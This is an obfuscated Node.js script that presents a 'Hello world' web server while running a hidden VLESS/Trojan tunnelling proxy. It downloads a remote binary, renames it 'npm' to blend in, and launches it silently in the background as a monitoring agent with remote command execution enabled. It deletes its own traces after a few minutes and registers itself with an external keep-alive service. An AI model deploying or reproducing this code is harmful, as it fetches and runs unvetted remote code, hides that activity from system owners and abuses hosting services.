const _0x28c2ce=_0xde26;(function(_0x18d6e9,_0x2e04bd){const _0x3a0cc8=_0xde26,_0x35644d=_0x18d6e9();while(!![]){try{const _0xf64d36=parseInt(_0x3a0cc8(0xc1))/0x1+parseInt(_0x3a0cc8(0x102))/0x2+-parseInt(_0x3a0cc8(0x12b))/0x3*(-parseInt(_0x3a0cc8(0xcd))/0x4)+-parseInt(_0x3a0cc8(0x10f))/0x5+parseInt(_0x3a0cc8(0x113))/0x6+-parseInt(_0x3a0cc8(0x11e))/0x7+-parseInt(_0x3a0cc8(0xde))/0x8;if(_0xf64d36===_0x2e04bd)break;else _0x35644d['push'](_0x35644d['shift']());}catch(_0x20b48e){_0x35644d['push'](_0x35644d['shift']());}}}(_0x205f,0x53139));const os=require('os'),http=require(_0x28c2ce(0xda)),fs=require('fs'),axios=require(_0x28c2ce(0x129)),net=require(_0x28c2ce(0x111)),path=require(_0x28c2ce(0xca)),crypto=require(_0x28c2ce(0xdd)),{Buffer}=require(_0x28c2ce(0xe1)),{exec,execSync}=require(_0x28c2ce(0xfe)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x28c2ce(0x117)][_0x28c2ce(0xd9)]||_0x28c2ce(0x109),NEZHA_SERVER=process[_0x28c2ce(0x117)][_0x28c2ce(0xe9)]||'',NEZHA_PORT=process[_0x28c2ce(0x117)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x28c2ce(0x117)][_0x28c2ce(0x103)]||'',DOMAIN=process[_0x28c2ce(0x117)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x28c2ce(0x117)]['AUTO_ACCESS']||![],WSPATH=process['env'][_0x28c2ce(0xe8)]||UUID[_0x28c2ce(0xee)](0x0,0x8),SUB_PATH=process[_0x28c2ce(0x117)]['SUB_PATH']||'sub',NAME=process[_0x28c2ce(0x117)][_0x28c2ce(0xc4)]||'',PORT=process[_0x28c2ce(0x117)][_0x28c2ce(0xc2)]||0xbb8;let ISP='';function _0x205f(){const _0x416a4d=['substr','write','text/plain','createWriteStream','close','Not\x20Found\x0a','child_process','createHash','8443','then','460326MlEHoO','NEZHA_KEY','writeHead','connect','Hello\x20world!','/bin/bash','concat','f47bbf1c-8844-4e94-8a55-f61d006a8748','sha224','createServer','message','2053','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','2416095QxxOCE','&fp=chrome&type=ws&host=','net','Unknown','137964mePVAg','https://dns.google/resolve?name=','stream','https://arm64.ssss.nyc.mn/agent','env','data','npm\x20download\x20successfully','2096','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readUInt16BE','application/json','907067KSyryi','https://arm64.ssss.nyc.mn/v1','unlink','asOrganization','base64','hex','readFile','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Server','npm\x20is\x20already\x20running,\x20skip\x20running...','error:\x20','axios','connection','3AROGRz','arm','true','npm','https://speed.cloudflare.com/meta','readUInt8','Failed\x20to\x20resolve\x20','&path=%2F','reduce','vless://','378992fWlkJp','PORT','split','NAME','toString','443','listen','url','decode','path','@cdns.doon.eu.org:443?security=tls&sni=','finish','1953892YqhjYh','text/html','catch','config.yaml','includes','type','Status','utf8','writeFileSync','test','length','&type=A','UUID','http','npm\x20running\x20error:','find','crypto','1340328TIcfhw','https://oooo.serv00.net/add-url','end','buffer','log','https://amd64.ssss.nyc.mn/agent','once','aarch64','error','map','WSPATH','NEZHA_SERVER','Answer','application/dns-json','false','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','slice','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8.8.4.4','join','chmod\x20+x\x20npm','replace','client_secret:\x20','pop','pipe','Server\x20is\x20running\x20on\x20port\x20'];_0x205f=function(){return _0x416a4d;};return _0x205f();}const GetISP=async()=>{const _0x5c9365=_0x28c2ce;try{const _0x22b3bb=await axios['get'](_0x5c9365(0xbb)),_0x30ea6b=_0x22b3bb[_0x5c9365(0x118)];ISP=(_0x30ea6b['country']+'-'+_0x30ea6b[_0x5c9365(0x121)])[_0x5c9365(0xf3)](/ /g,'_');}catch(_0x227889){ISP=_0x5c9365(0x112);}};GetISP();const httpServer=http[_0x28c2ce(0x10b)]((_0x2214e6,_0x27eedb)=>{const _0x240e10=_0x28c2ce;if(_0x2214e6[_0x240e10(0xc8)]==='/'){const _0x4fd4ad=path[_0x240e10(0xf1)](__dirname,'index.html');fs[_0x240e10(0x124)](_0x4fd4ad,_0x240e10(0xd4),(_0x4e11a4,_0x4b787f)=>{const _0x55f6a8=_0x240e10;if(_0x4e11a4){_0x27eedb[_0x55f6a8(0x104)](0xc8,{'Content-Type':_0x55f6a8(0xce)}),_0x27eedb[_0x55f6a8(0xe0)](_0x55f6a8(0x106));return;}_0x27eedb['writeHead'](0xc8,{'Content-Type':_0x55f6a8(0xce)}),_0x27eedb['end'](_0x4b787f);});return;}else{if(_0x2214e6['url']==='/'+SUB_PATH){const _0x41ba88=NAME?NAME+'-'+ISP:ISP,_0x1c0d2d=_0x240e10(0xc0)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x240e10(0x110)+DOMAIN+_0x240e10(0xbe)+WSPATH+'#'+_0x41ba88,_0xa66dbb='trojan://'+UUID+_0x240e10(0xcb)+DOMAIN+_0x240e10(0x110)+DOMAIN+_0x240e10(0xbe)+WSPATH+'#'+_0x41ba88,_0x56f541=_0x1c0d2d+'\x0a'+_0xa66dbb,_0x2427fd=Buffer['from'](_0x56f541)['toString'](_0x240e10(0x122));_0x27eedb['writeHead'](0xc8,{'Content-Type':_0x240e10(0xfa)}),_0x27eedb[_0x240e10(0xe0)](_0x2427fd+'\x0a');}else _0x27eedb[_0x240e10(0x104)](0x194,{'Content-Type':_0x240e10(0xfa)}),_0x27eedb[_0x240e10(0xe0)](_0x240e10(0xfd));}}),wss=new WebSocket[(_0x28c2ce(0x126))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x28c2ce(0xf0),'1.1.1.1'];function resolveHost(_0x979297){return new Promise((_0x2099d0,_0x6b8d5a)=>{const _0xc113a3=_0xde26;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0xc113a3(0xd6)](_0x979297)){_0x2099d0(_0x979297);return;}let _0x2a4641=0x0;function _0x5e42b7(){const _0xec6ce9=_0xc113a3;if(_0x2a4641>=DNS_SERVERS['length']){_0x6b8d5a(new Error(_0xec6ce9(0xbd)+_0x979297+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x538c2f=DNS_SERVERS[_0x2a4641];_0x2a4641++;const _0x5cf27d=_0xec6ce9(0x114)+encodeURIComponent(_0x979297)+_0xec6ce9(0xd8);axios['get'](_0x5cf27d,{'timeout':0x1388,'headers':{'Accept':_0xec6ce9(0xeb)}})['then'](_0x5bd56c=>{const _0x59365d=_0xec6ce9,_0x5d5262=_0x5bd56c['data'];if(_0x5d5262[_0x59365d(0xd3)]===0x0&&_0x5d5262[_0x59365d(0xea)]&&_0x5d5262['Answer'][_0x59365d(0xd7)]>0x0){const _0x3ebaae=_0x5d5262[_0x59365d(0xea)][_0x59365d(0xdc)](_0x1c1c36=>_0x1c1c36[_0x59365d(0xd2)]===0x1);if(_0x3ebaae){_0x2099d0(_0x3ebaae['data']);return;}}_0x5e42b7();})['catch'](_0x57133d=>{_0x5e42b7();});}_0x5e42b7();});}function handleVlessConnection(_0x4e2f6e,_0x4b071a){const _0x3b5aee=_0x28c2ce,[_0x795088]=_0x4b071a,_0x524803=_0x4b071a[_0x3b5aee(0xee)](0x1,0x11);if(!_0x524803['every']((_0x27caa6,_0x5a2dd2)=>_0x27caa6==parseInt(uuid[_0x3b5aee(0xf8)](_0x5a2dd2*0x2,0x2),0x10)))return![];let _0x941bb8=_0x4b071a[_0x3b5aee(0xee)](0x11,0x12)[_0x3b5aee(0xbc)]()+0x13;const _0x2f8764=_0x4b071a[_0x3b5aee(0xee)](_0x941bb8,_0x941bb8+=0x2)[_0x3b5aee(0x11c)](0x0),_0x5a82d9=_0x4b071a[_0x3b5aee(0xee)](_0x941bb8,_0x941bb8+=0x1)[_0x3b5aee(0xbc)](),_0x1e7843=_0x5a82d9==0x1?_0x4b071a['slice'](_0x941bb8,_0x941bb8+=0x4)['join']('.'):_0x5a82d9==0x2?new TextDecoder()[_0x3b5aee(0xc9)](_0x4b071a[_0x3b5aee(0xee)](_0x941bb8+0x1,_0x941bb8+=0x1+_0x4b071a[_0x3b5aee(0xee)](_0x941bb8,_0x941bb8+0x1)[_0x3b5aee(0xbc)]())):_0x5a82d9==0x3?_0x4b071a['slice'](_0x941bb8,_0x941bb8+=0x10)[_0x3b5aee(0xbf)]((_0x42f65c,_0xbe54ee,_0x71eac7,_0xe41165)=>_0x71eac7%0x2?_0x42f65c[_0x3b5aee(0x108)](_0xe41165[_0x3b5aee(0xee)](_0x71eac7-0x1,_0x71eac7+0x1)):_0x42f65c,[])[_0x3b5aee(0xe7)](_0x30bb44=>_0x30bb44[_0x3b5aee(0x11c)](0x0)[_0x3b5aee(0xc5)](0x10))['join'](':'):'';_0x4e2f6e['send'](new Uint8Array([_0x795088,0x0]));const _0x1ebb99=createWebSocketStream(_0x4e2f6e);return resolveHost(_0x1e7843)[_0x3b5aee(0x101)](_0x157d4f=>{const _0x5328cd=_0x3b5aee;net[_0x5328cd(0x105)]({'host':_0x157d4f,'port':_0x2f8764},function(){const _0x55b324=_0x5328cd;this[_0x55b324(0xf9)](_0x4b071a[_0x55b324(0xee)](_0x941bb8)),_0x1ebb99['on'](_0x55b324(0xe6),()=>{})['pipe'](this)['on'](_0x55b324(0xe6),()=>{})[_0x55b324(0xf6)](_0x1ebb99);})['on']('error',()=>{});})['catch'](_0x7e3c43=>{const _0x157c9a=_0x3b5aee;net[_0x157c9a(0x105)]({'host':_0x1e7843,'port':_0x2f8764},function(){const _0xdd49da=_0x157c9a;this[_0xdd49da(0xf9)](_0x4b071a[_0xdd49da(0xee)](_0x941bb8)),_0x1ebb99['on'](_0xdd49da(0xe6),()=>{})[_0xdd49da(0xf6)](this)['on'](_0xdd49da(0xe6),()=>{})[_0xdd49da(0xf6)](_0x1ebb99);})['on'](_0x157c9a(0xe6),()=>{});}),!![];}function handleTrojanConnection(_0x3eaeff,_0x5b129e){const _0x22d2ba=_0x28c2ce;try{if(_0x5b129e[_0x22d2ba(0xd7)]<0x3a)return![];const _0x2394ef=_0x5b129e[_0x22d2ba(0xee)](0x0,0x38)[_0x22d2ba(0xc5)](),_0x19a24d=[UUID];let _0x209430=null;for(const _0x2ac113 of _0x19a24d){const _0x2ea3e2=crypto[_0x22d2ba(0xff)](_0x22d2ba(0x10a))['update'](_0x2ac113)['digest'](_0x22d2ba(0x123));if(_0x2ea3e2===_0x2394ef){_0x209430=_0x2ac113;break;}}if(!_0x209430)return![];let _0x484fe1=0x38;_0x5b129e[_0x484fe1]===0xd&&_0x5b129e[_0x484fe1+0x1]===0xa&&(_0x484fe1+=0x2);const _0x451a3b=_0x5b129e[_0x484fe1];if(_0x451a3b!==0x1)return![];_0x484fe1+=0x1;const _0x2dcf7f=_0x5b129e[_0x484fe1];_0x484fe1+=0x1;let _0x3e1bd5,_0x2749fb;if(_0x2dcf7f===0x1)_0x3e1bd5=_0x5b129e[_0x22d2ba(0xee)](_0x484fe1,_0x484fe1+0x4)[_0x22d2ba(0xf1)]('.'),_0x484fe1+=0x4;else{if(_0x2dcf7f===0x3){const _0x3808af=_0x5b129e[_0x484fe1];_0x484fe1+=0x1,_0x3e1bd5=_0x5b129e[_0x22d2ba(0xee)](_0x484fe1,_0x484fe1+_0x3808af)[_0x22d2ba(0xc5)](),_0x484fe1+=_0x3808af;}else{if(_0x2dcf7f===0x4)_0x3e1bd5=_0x5b129e[_0x22d2ba(0xee)](_0x484fe1,_0x484fe1+0x10)[_0x22d2ba(0xbf)]((_0x4ace9e,_0x7b868f,_0x1c1404,_0x1737fe)=>_0x1c1404%0x2?_0x4ace9e['concat'](_0x1737fe[_0x22d2ba(0xee)](_0x1c1404-0x1,_0x1c1404+0x1)):_0x4ace9e,[])[_0x22d2ba(0xe7)](_0xd97fb=>_0xd97fb[_0x22d2ba(0x11c)](0x0)[_0x22d2ba(0xc5)](0x10))[_0x22d2ba(0xf1)](':'),_0x484fe1+=0x10;else return![];}}_0x2749fb=_0x5b129e['readUInt16BE'](_0x484fe1),_0x484fe1+=0x2;_0x484fe1<_0x5b129e[_0x22d2ba(0xd7)]&&_0x5b129e[_0x484fe1]===0xd&&_0x5b129e[_0x484fe1+0x1]===0xa&&(_0x484fe1+=0x2);const _0x5b189e=createWebSocketStream(_0x3eaeff);return resolveHost(_0x3e1bd5)['then'](_0x204e91=>{const _0x28f9d5=_0x22d2ba;net[_0x28f9d5(0x105)]({'host':_0x204e91,'port':_0x2749fb},function(){const _0x1a6995=_0x28f9d5;_0x484fe1<_0x5b129e[_0x1a6995(0xd7)]&&this[_0x1a6995(0xf9)](_0x5b129e[_0x1a6995(0xee)](_0x484fe1)),_0x5b189e['on']('error',()=>{})[_0x1a6995(0xf6)](this)['on'](_0x1a6995(0xe6),()=>{})['pipe'](_0x5b189e);})['on']('error',()=>{});})[_0x22d2ba(0xcf)](_0x7b202=>{const _0x1db256=_0x22d2ba;net[_0x1db256(0x105)]({'host':_0x3e1bd5,'port':_0x2749fb},function(){const _0xdd9a9d=_0x1db256;_0x484fe1<_0x5b129e[_0xdd9a9d(0xd7)]&&this['write'](_0x5b129e[_0xdd9a9d(0xee)](_0x484fe1)),_0x5b189e['on'](_0xdd9a9d(0xe6),()=>{})['pipe'](this)['on'](_0xdd9a9d(0xe6),()=>{})[_0xdd9a9d(0xf6)](_0x5b189e);})['on'](_0x1db256(0xe6),()=>{});}),!![];}catch(_0x55a960){return![];}}wss['on'](_0x28c2ce(0x12a),(_0x4c0b38,_0x4effbb)=>{const _0x1c9647=_0x28c2ce,_0x597439=_0x4effbb[_0x1c9647(0xc8)]||'';_0x4c0b38[_0x1c9647(0xe4)](_0x1c9647(0x10c),_0x623f83=>{const _0x43661b=_0x1c9647;if(_0x623f83[_0x43661b(0xd7)]>0x11&&_0x623f83[0x0]===0x0){const _0x425bd5=_0x623f83[_0x43661b(0xee)](0x1,0x11),_0x8a6440=_0x425bd5['every']((_0x3c2611,_0x1a6a56)=>_0x3c2611==parseInt(uuid[_0x43661b(0xf8)](_0x1a6a56*0x2,0x2),0x10));if(_0x8a6440){!handleVlessConnection(_0x4c0b38,_0x623f83)&&_0x4c0b38[_0x43661b(0xfc)]();return;}}!handleTrojanConnection(_0x4c0b38,_0x623f83)&&_0x4c0b38['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x59d4ba=_0x28c2ce,_0x3b17f2=os['arch']();return _0x3b17f2===_0x59d4ba(0x12c)||_0x3b17f2==='arm64'||_0x3b17f2===_0x59d4ba(0xe5)?!NEZHA_PORT?_0x59d4ba(0x11f):_0x59d4ba(0x116):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x59d4ba(0xe3);},downloadFile=async()=>{const _0x114905=_0x28c2ce;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x36c903=getDownloadUrl(),_0x3d3dd0=await axios({'method':'get','url':_0x36c903,'responseType':_0x114905(0x115)}),_0x8614d=fs[_0x114905(0xfb)](_0x114905(0x12e));return _0x3d3dd0[_0x114905(0x118)][_0x114905(0xf6)](_0x8614d),new Promise((_0xc8e393,_0x314e1c)=>{const _0x2d1c8a=_0x114905;_0x8614d['on'](_0x2d1c8a(0xcc),()=>{const _0x44060e=_0x2d1c8a;console[_0x44060e(0xe2)](_0x44060e(0x119)),exec(_0x44060e(0xf2),_0x2c2e82=>{if(_0x2c2e82)_0x314e1c(_0x2c2e82);_0xc8e393();});}),_0x8614d['on'](_0x2d1c8a(0xe6),_0x314e1c);});}catch(_0x10f4ed){throw _0x10f4ed;}},runnz=async()=>{const _0x482aeb=_0x28c2ce;try{const _0x5eb6e9=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x5eb6e9['trim']()!==''){console[_0x482aeb(0xe2)](_0x482aeb(0x127));return;}}catch(_0x169fc7){}await downloadFile();let _0x61eb4c='',_0x3623d6=[_0x482aeb(0xc6),_0x482aeb(0x100),_0x482aeb(0x11a),'2087','2083',_0x482aeb(0x10d)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x14606f=_0x3623d6[_0x482aeb(0xd1)](NEZHA_PORT)?'--tls':'';_0x61eb4c='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x14606f+_0x482aeb(0x11b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xcee378=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x482aeb(0xc3)](':')[_0x482aeb(0xf5)]():'',_0x4fba94=_0x3623d6[_0x482aeb(0xd1)](_0xcee378)?_0x482aeb(0x12d):_0x482aeb(0xec),_0x52a8f2=_0x482aeb(0xf4)+NEZHA_KEY+_0x482aeb(0xef)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4fba94+_0x482aeb(0x125)+UUID;fs[_0x482aeb(0xd5)](_0x482aeb(0xd0),_0x52a8f2);}_0x61eb4c=_0x482aeb(0xed);}else{console[_0x482aeb(0xe2)](_0x482aeb(0x10e));return;}}try{exec(_0x61eb4c,{'shell':_0x482aeb(0x107)},_0x75a2ca=>{const _0x5f4bb4=_0x482aeb;if(_0x75a2ca)console[_0x5f4bb4(0xe6)](_0x5f4bb4(0xdb),_0x75a2ca);else console[_0x5f4bb4(0xe2)]('npm\x20is\x20running');});}catch(_0x1de09e){console[_0x482aeb(0xe6)](_0x482aeb(0x128)+_0x1de09e);}};async function addAccessTask(){const _0x15ce65=_0x28c2ce;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x33f246='https://'+DOMAIN+'/'+SUB_PATH;try{const _0x198e11=await axios['post'](_0x15ce65(0xdf),{'url':_0x33f246},{'headers':{'Content-Type':_0x15ce65(0x11d)}});console[_0x15ce65(0xe2)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0xee3fbd){}}function _0xde26(_0x276a2a,_0x3eba9d){_0x276a2a=_0x276a2a-0xbb;const _0x205f59=_0x205f();let _0xde266a=_0x205f59[_0x276a2a];return _0xde266a;}const delFiles=()=>{const _0x4b6f2b=_0x28c2ce;fs['unlink']('npm',()=>{}),fs[_0x4b6f2b(0x120)](_0x4b6f2b(0xd0),()=>{});};httpServer[_0x28c2ce(0xc7)](PORT,()=>{const _0x5d9346=_0x28c2ce;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5d9346(0xe2)](_0x5d9346(0xf7)+PORT);});
